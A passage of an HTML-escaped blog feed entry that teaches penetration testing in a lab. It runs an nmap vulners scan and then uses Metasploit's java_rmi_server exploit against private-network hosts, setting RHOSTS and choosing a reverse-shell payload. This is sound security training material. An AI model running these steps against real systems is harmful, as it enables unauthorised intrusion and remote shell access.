+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;One popular vulnerability scanning script is available at: &lt;a href=&#34;https://github.com/vulnersCom/nmap-vulners&#34;&gt;https://github.com/vulnersCom/nmap-vulners&lt;/a&gt;. Here is an example of a previous scan on an HTTPS server with several vulnerabilities:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap --script vulners -sV 192.168.56.108
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;images/vulners_scan.png&#34;  class=&#34;left&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;All scripts are located under &lt;code&gt;/usr/share/nmap/scripts/&lt;/code&gt;. You can create your own scripts or download scripts and place them in that directory.&lt;/p&gt;
+&lt;h2 id=&#34;using-metasploit&#34;&gt;Using metasploit&lt;/h2&gt;
+&lt;p&gt;To start the Metasploit console, enter the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once the console is open, you will have access to various tools. You can search for specific tools based on your requirements. For example, if you&amp;rsquo;re attacking an Apache server, you can search for available tools:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search apache
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The search will provide multiple results. You can narrow down the search to find the desired tool. The tools in Metasploit come in two main categories: scanners and exploits. Scanners are similar to nmap but usually more specialized, while exploits can perform actions like memory dumping and gaining a reverse shell.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s take an example of using the &lt;code&gt;java_rmi_server&lt;/code&gt; module. First, enter &lt;code&gt;use &amp;lt;module&amp;gt;&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 &amp;gt; use multi/misc/java_rmi_server
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; No payload configured, defaulting to java/meterpreter/reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/misc/java_rmi_server&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To view the options for the module, use the &lt;code&gt;info&lt;/code&gt; command. It will provide detailed information, including a description. You can also use &lt;code&gt;show options&lt;/code&gt; which gives you the essential information needed to run the module. From there, you can identify any missing settings:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/misc/java_rmi_server&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; show options
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Module options &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;exploit/multi/misc/java_rmi_server&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Name       Current Setting  Required  Description
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ----       ---------------  --------  -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   HTTPDELAY  &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;               yes       Time that the HTTP Server will wait &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the payload request
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   RHOSTS                      yes       The target host&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                         it.html
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   RPORT      &lt;span style=&#34;color:#ae81ff&#34;&gt;1099&lt;/span&gt;             yes       The target port &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;TCP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                         or 0.0.0.0 to listen on all addresses.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   SRVPORT    &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;             yes       The local port to listen on.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   SSL        false            no        Negotiate SSL &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; incoming connections
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   SSLCert                     no        Path to a custom SSL certificate &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is randomly generated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   URIPATH                     no        The URI to use &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this exploit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is random&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Payload options &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;java/meterpreter/reverse_tcp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Name   Current Setting  Required  Description
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ----   ---------------  --------  -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   LHOST  172.19.119.45    yes       The listen address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   LPORT  &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;             yes       The listen port
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exploit target:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Id  Name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   --  ----
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   Generic &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Java Payload&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;View the full module info with the info, or info -d command.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Typically, the &lt;code&gt;RHOSTS&lt;/code&gt; and &lt;code&gt;RPORT&lt;/code&gt; settings are required. If &lt;code&gt;RPORT&lt;/code&gt; is already set, you can proceed to set the &lt;code&gt;RHOSTS&lt;/code&gt;. Here&amp;rsquo;s a helpful tip: Use setg to set the values globally. This way, the settings will be saved when switching between modules:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/misc/java_rmi_server&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; setg RHOSTS 192.168.56.101
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RHOSTS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; 192.168.56.101
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can select different payloads depending on the context. In general, you don&amp;rsquo;t change the exploit itself, but rather the code it uses to establish a reverse shell:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/misc/java_rmi_server&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; show payloads
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Compatible Payloads
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;#   Name                                     Disclosure Date  Rank    Check  Description&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   -   ----                                     ---------------  ----    -----  -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   payload/generic/custom                                    normal  No     Custom Payload
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;   payload/generic/shell_bind_aws_ssm                        normal  No     Command Shell, Bind SSM &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;via AWS API&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;   payload/generic/shell_bind_tcp                            normal  No     Generic Command Shell, Bind TCP Inline
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;   payload/generic/shell_reverse_tcp                         normal  No     Generic Command Shell, Reverse TCP Inline
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;   payload/generic/ssh/interact                              normal  No     Interact with Established SSH Connection
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;   payload/java/jsp_shell_bind_tcp                           normal  No     Java JSP Command Shell, Bind TCP Inline
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;   payload/java/jsp_shell_reverse_tcp                        normal  No     Java JSP Command Shell, Reverse TCP Inline
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;   payload/java/meterpreter/bind_tcp                         normal  No     Java Meterpreter, Java Bind TCP Stager
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;   payload/java/meterpreter/reverse_http                     normal  No     Java Meterpreter, Java Reverse HTTP Stager
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;   payload/java/meterpreter/reverse_https                    normal  No     Java Meterpreter, Java Reverse HTTPS Stager
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;  payload/java/meterpreter/reverse_tcp                      normal  No     Java Meterpreter, Java Reverse TCP Stager
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;  payload/java/shell/bind_tcp                               normal  No     Command Shell, Java Bind TCP Stager
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;  payload/java/shell/reverse_tcp                            normal  No     Command Shell, Java Reverse TCP Stager
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;  payload/java/shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;  payload/multi/meterpreter/reverse_http                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Multiple Architectures&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  payload/multi/meterpreter/reverse_https                   normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Multiple Architectures&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;payload/generic/shell_reverse_tcp&lt;/code&gt; looks fun! Lets use it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/misc/java_rmi_server&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set payload &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; generic/shell_reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, you can run the exploit using the &lt;code&gt;exploit&lt;/code&gt; command (or &lt;code&gt;run&lt;/code&gt;):&lt;/p&gt;
+
+  &lt;img src=&#34;images/java_rmi_server.png&#34;  class=&#34;left&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+</content>
     </item>
     
   </channel>
